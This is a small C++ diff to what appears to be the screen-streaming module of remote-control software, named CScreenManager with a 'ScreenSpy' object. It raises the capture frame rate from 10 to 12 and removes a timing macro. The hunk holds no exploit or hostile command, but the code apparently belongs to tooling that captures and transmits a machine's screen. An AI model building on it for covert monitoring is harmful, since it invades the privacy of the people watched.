@@ -43,7 +43,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 
 	clock_t last = clock();
 	This->SendFirstScreen();
-	const int fps = 10;// 帧率
+	const int fps = 12;// 帧率
 	const int sleep = 1000 / fps;// 间隔时间（ms）
 	while (This->m_bIsWorking)
 	{
@@ -202,7 +202,6 @@ VOID CScreenManager::SendFirstScreen()
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 {
-	AUTO_TICK(5);
 	LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
 
 	if (ulNextSendLength == 0 || NextScreenData == NULL)
